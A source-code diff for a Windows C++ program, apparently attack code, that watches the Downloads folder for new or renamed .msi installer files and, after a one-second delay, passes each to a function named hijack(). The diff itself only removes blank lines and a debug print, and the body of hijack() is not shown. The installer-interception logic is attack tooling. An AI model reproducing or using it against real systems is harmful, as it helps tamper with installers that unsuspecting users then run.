@@ -76,8 +76,6 @@ void WatchDirectory(const wchar_t* target)
         OPEN_EXISTING,
         FILE_FLAG_BACKUP_SEMANTICS,
         NULL);
-
-
     while (TRUE)
     {
         BYTE buffer[4096];
@@ -86,32 +84,22 @@ void WatchDirectory(const wchar_t* target)
         ReadDirectoryChangesW(hDir, buffer, sizeof(buffer), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &dwBytesReturned, NULL, NULL);
         BYTE* p = buffer;
         for (;;) {
-  
-            FILE_NOTIFY_INFORMATION* fni =
+             FILE_NOTIFY_INFORMATION* fni =
                 reinterpret_cast<FILE_NOTIFY_INFORMATION*>(p);
             if(fni->Action == FILE_ACTION_ADDED || fni->Action == FILE_ACTION_RENAMED_NEW_NAME) {
-            
-           
                 wstring Test(target);
                 Test += L"\\";
                 Test += fni->FileName;
-                
                 wchar_t* extension = PathFindExtension(fni->FileName);
-                wcout << extension << endl;
                 if (wcscmp(extension, L".msi") == 0)
                 {
-            
-
-                          Sleep(1000);
+                         Sleep(1000);
                          hijack(Test.c_str());
-      
-                      
                 }
             }
             if (!fni->NextEntryOffset) break;
             p += fni->NextEntryOffset;
- 
-        }
+         }
     }
 }
 wchar_t* GetDownloadDirectory()
@@ -119,11 +107,8 @@ wchar_t* GetDownloadDirectory()
     LPWSTR lpRet = nullptr;
     if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Downloads, 0, nullptr, &lpRet)))
     {
-
-
         return lpRet;
     }
-
     return NULL;
 }
 int main()
